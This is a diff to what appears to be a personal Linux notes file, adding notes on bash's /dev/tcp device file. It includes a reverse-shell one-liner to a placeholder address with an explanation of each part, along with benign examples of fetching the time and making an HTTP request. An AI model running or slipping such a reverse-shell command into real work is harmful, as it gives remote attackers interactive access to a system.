@@ -2301,3 +2301,23 @@ choices:
   3. /usr/bin/emacs24
   4. /usr/bin/vim.basic
   5. /usr/bin/vim.tiny
+
+reverse shell:
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+The command bash -i >& invokes bash with an “interactive” option. Then /dev/tcp/10.0.0.1/8080
+redirects that session to a tcp socket via device file.  Finally 0>&1 Takes standard output, and
+connects it to standard input.
+
+bash's built-in /dev/tcp device file
+
+get time:
+$ cat </dev/tcp/time.nist.gov/13
+58341 18-08-11 17:55:07 50 0 0   0.0 UTC(NIST) *
+$ curl time.nist.gov:13
+58341 18-08-11 17:55:20 50 0 0 385.1 UTC(NIST) *
+
+# causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket.
+exec 3<>/dev/tcp/www.google.com/80
+echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
+cat <&3
